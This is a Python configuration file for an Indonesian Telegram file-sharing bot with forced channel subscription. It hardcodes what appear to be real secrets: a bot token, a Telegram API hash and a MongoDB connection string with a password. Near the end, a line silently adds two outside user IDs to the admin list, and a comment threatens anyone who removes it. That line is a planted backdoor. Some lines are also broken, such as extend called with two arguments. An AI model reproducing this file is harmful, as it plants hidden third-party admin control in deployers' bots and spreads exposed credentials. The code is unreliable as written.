# (©)Codexbotz
# Recode by @mrismanaziz
# t.me/SharingUserbot & t.me/Lunatic0de

import logging
import os
from distutils.util import strtobool
from dotenv import load_dotenv
from logging.handlers import RotatingFileHandler

load_dotenv("config.env")

# Bot token dari @Botfather
TG_BOT_TOKEN = os.environ.get("TG_BOT_TOKEN", "6980611537:AAF0ZPhgsnqAE0CzpbM9lc_9vF1Px7D4SMg")

# API ID Anda dari my.telegram.org
APP_ID = int(os.environ.get("APP_ID", "10064016"))

# API Hash Anda dari my.telegram.org
API_HASH = os.environ.get("API_HASH", "b9ca5d9a6c625a890af28db4adf50cf4")

# ID Channel Database
CHANNEL_ID = int(os.environ.get("CHANNEL_ID", "-1002027693771"))

#JUMLAH BUTTONS
BUTTONS = int(os.environ.get("BUTTONS", ))

# NAMA OWNER
OWNER = os.environ.get("OWNER", "Arabnihnge")

# Protect Content
PROTECT_CONTENT = strtobool(os.environ.get("PROTECT_CONTENT", "False"))

# Heroku Credentials for updater.
HEROKU_APP_NAME = os.environ.get("HEROKU_APP_NAME", None)
HEROKU_API_KEY = os.environ.get("HEROKU_API_KEY", None)

# Custom Repo for updater.
UPSTREAM_BRANCH = os.environ.get("UPSTREAM_BRANCH", "master")

# Database
MONGO_URI = os.environ.get("MONGO_URI", "mongodb+srv://Ultra2:fadhil123@cluster0.triyami.mongodb.net/")
DB_NAME = os.environ.get("DB_NAME", "Ultra2")

# ID Channel FSUB-BUTT kalo ga pake isi 0
FSUB1 = int(os.environ.get("FSUB1", "-1002035236535"))
FSUB2 = int(os.environ.get("FSUB2", "-1001526366621"))
FSUB3 = int(os.environ.get("FSUB3", "-1001898026780"))
FSUB4 = int(os.environ.get("FSUB4", "-1001916251589"))
FSUB5 = int(os.environ.get("FSUB5", "0"))
FSUB6 = int(os.environ.get("FSUB6", "0"))
FSUB7 = int(os.environ.get("FSUB7", "0"))
FSUB8 = int(os.environ.get("FSUB8", "0"))
FSUB9 = int(os.environ.get("FSUB9", "0"))
FSUB10 = int(os.environ.get("FSUB10", "0"))

TG_BOT_WORKERS = int(os.environ.get("TG_BOT_WORKERS", "4"))

# Pesan Awalan /start
START_MSG = os.environ.get(
    "START_MESSAGE",
    """
<b>Hallo {first}</b>

<b>Saya adalah bot file sharing saya bisa mengirim kamu file melalui link yg telah dibuat

Sebelum menggunakan saya kamu wajib join channel saya jika tidak kamu tidak akan bisa menggunakan saya

Mau bikin bot kaya gini? Pc @Arabnihnge</b>
"""
)
try:
    ADMINS = [int(x) for x in (os.environ.get("ADMINS", "6824711323").split())]
except ValueError:
    raise Exception("Daftar Admin Anda tidak berisi User ID Telegram yang valid.")

# Pesan Saat Memaksa Subscribe
FORCE_MSG = os.environ.get(
    "FORCE_SUB_MESSAGE",
    """
<b>Hallo {first}

Kamu harus join channel saya sebelum memakai saya
Join channel dibawah untuk mendapatkan file nya

Mau bikin bot kaya gini? Pc @Arabnihnge</b>
"""
)

# Atur Teks Kustom Anda di sini, Simpan (None) untuk Menonaktifkan Teks Kustom
CUSTOM_CAPTION = os.environ.get("CUSTOM_CAPTION", None)

# Setel True jika Anda ingin Menonaktifkan tombol Bagikan Kiriman Saluran Anda
DISABLE_CHANNEL_BUTTON = strtobool(os.environ.get("DISABLE_CHANNEL_BUTTON", "False"))

# Jangan Dihapus nanti ERROR, HAPUS ID Dibawah ini = TERIMA KONSEKUENSI
# Spoiler KONSEKUENSI-nya Paling CH nya tiba tiba ilang & owner nya gua gban 🤪
ADMINS.extend(1814359323, 1948147616)


LOG_FILE_NAME = "logs.txt"
logging.basicConfig(
    level=logging.INFO,
    format="[%(levelname)s] - %(name)s - %(message)s",
    datefmt="%d-%b-%y %H:%M:%S",
    handlers=[
        RotatingFileHandler(LOG_FILE_NAME, maxBytes=50000000, backupCount=10),
        logging.StreamHandler(),
    ],
)
logging.getLogger("pyrogram").setLevel(logging.WARNING)


def LOGGER(name: str) -> logging.Logger:
    return logging.getLogger(name)
